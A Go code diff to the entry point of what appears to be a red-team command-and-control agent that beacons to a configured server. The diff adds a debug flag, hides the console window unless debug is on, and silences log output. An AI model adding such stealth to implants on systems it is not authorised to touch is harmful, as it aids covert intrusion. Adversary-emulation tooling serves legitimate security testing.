@@ -4,7 +4,6 @@ import (
 	"flag"
 	"github.com/preludeorg/pneuma/sockets"
 	"github.com/preludeorg/pneuma/util"
-	"log"
 	"os"
 	"strings"
 )
@@ -20,6 +19,7 @@ func main() {
 	group := flag.String("range", agent.Range, "Which range to associate to")
 	sleep := flag.Int("sleep", agent.Sleep, "Number of seconds to sleep between beacons")
 	useragent := flag.String("useragent", agent.Useragent, "User agent used when connecting")
+	debug := flag.Bool("debug", agent.Debug, "Write debug output to console")
 	flag.Parse()
 	agent.SetAgentConfig(map[string]interface{}{
 		"Name": *name,
@@ -28,13 +28,17 @@ func main() {
 		"Range": *group,
 		"Useragent": *useragent,
 		"Sleep": *sleep,
+		"Debug": *debug,
 	})
+	if !agent.Debug {
+		util.HideConsole()
+	}
 	if !strings.Contains(agent.Address, ":") {
-		log.Println("Your address is incorrect")
+		util.DebugLogf("Your address is incorrect\n")
 		os.Exit(1)
 	}
 	util.EncryptionKey = &agent.AESKey
 	sockets.UA = &agent.Useragent
-	log.Printf("[%s] agent at PID %d using key %s", agent.Address, os.Getpid(), key)
+	util.DebugLogf("[%s] agent at PID %d using key %s", agent.Address, os.Getpid(), key)
 	sockets.EventLoop(agent, agent.BuildBeacon())
 }
